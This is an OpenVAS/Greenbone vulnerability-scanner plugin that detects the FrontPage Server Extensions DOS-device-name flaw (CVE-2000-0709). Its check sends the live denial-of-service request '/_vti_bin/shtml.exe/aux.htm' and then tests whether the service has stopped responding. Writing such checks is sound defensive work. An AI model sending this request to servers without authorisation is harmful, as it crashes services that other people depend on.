# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:microsoft:internet_information_services";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902839");
  script_version("2023-10-10T05:05:41+0000");
  script_cve_id("CVE-2000-0709");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_tag(name:"last_modification", value:"2023-10-10 05:05:41 +0000 (Tue, 10 Oct 2023)");
  script_tag(name:"creation_date", value:"2012-05-24 17:17:17 +0530 (Thu, 24 May 2012)");
  script_name("Microsoft FrontPage Server Extensions MS-DOS Device Name DoS Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web Servers");
  script_dependencies("gb_microsoft_iis_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("IIS/installed");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/5124");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/1608");
  script_xref(name:"URL", value:"http://www.securiteam.com/windowsntfocus/5NP0N0U2AA.html");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2000-08/0288.html");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to cause denial of service
  conditions.");

  script_tag(name:"affected", value:"Microsoft FrontPage 2000 Server Extensions 1.1.");

  script_tag(name:"insight", value:"The flaw is due to an error in the 'shtml.exe' component, which
  allows remote attackers to cause a denial of service in some components
  by requesting a URL whose name includes a standard DOS device name.");

  script_tag(name:"solution", value:"Upgrade to Microsoft FrontPage 2000 Server Extensions 1.2 or later.");

  script_tag(name:"summary", value:"Microsoft FrontPage Server Extensions is prone to a denial of service (DoS) vulnerability.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

url = "/_vti_bin/shtml.exe";

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

if( http_vuln_check( port:port, url:url, check_header:TRUE,
    pattern:"FrontPage Server Extensions", extra_check:"Server: Microsoft-IIS" ) ) {

  vulnurl = "/_vti_bin/shtml.exe/aux.htm";
  req = http_get( item:vulnurl, port:port );
  http_send_recv( port:port, data:req );

  req = http_get( item:url, port:port );
  res = http_send_recv( port:port, data:req );

  if( ! res ) {
    ## FrontPage Server Extensions are not running
    report = http_report_vuln_url( port:port, url:vulnurl );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
